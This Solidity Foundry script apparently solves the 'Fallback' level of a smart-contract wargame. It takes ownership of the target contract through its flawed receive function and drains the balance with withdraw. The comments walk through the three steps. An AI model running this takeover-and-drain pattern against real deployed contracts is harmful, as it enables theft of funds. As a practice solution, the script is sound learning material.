//SPDX-License-Identifier:MIT
pragma solidity ^0.8.0;

import "../src/Fallback.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";
/*
SOLUTION OBJECTIVES:
- Claim contract ownership
- Drain the contract balance to zero.
*/

/*
SOLUTION:
It is observed that there is an external receive function that changes the ownership of the contract,
but this function requires a minimum contribution by the sender. So we can call the functions in the following order:
1) Call the contribute function with an amount of 0.0001 , this will register a contribution in the mapping
    and it satisfies the contributions[msg.sender] > 0 condition in the receive function.
2) send a payment >0 to the receive function, the sender (we) are now the owner of the contract.
3) Call the withdraw function to drain the contract.
*/

contract level_1_solution is Script {
    Fallback public fallbackInstance =
        Fallback(payable(0x58ad34Ab47114B45a29a2541347E49B086c3B3E6));
    function run() external {
        string memory mnemonic = vm.envString("MY_PRIVATE_KEY");
        uint256 deployerPrivateKey = vm.deriveKey(mnemonic, 0);
        vm.startBroadcast(deployerPrivateKey);

        fallbackInstance.contribute{value: 1 wei}();
        address(fallbackInstance).call{value: 1 wei}(""); //low-level call to send 1 wei to the contract address.
        console.log("New owner of contract:", fallbackInstance.owner());
        console.log("My address:", vm.envAddress("MY_ADDRESS"));
        fallbackInstance.withdraw();

        vm.stopBroadcast();
    }
}
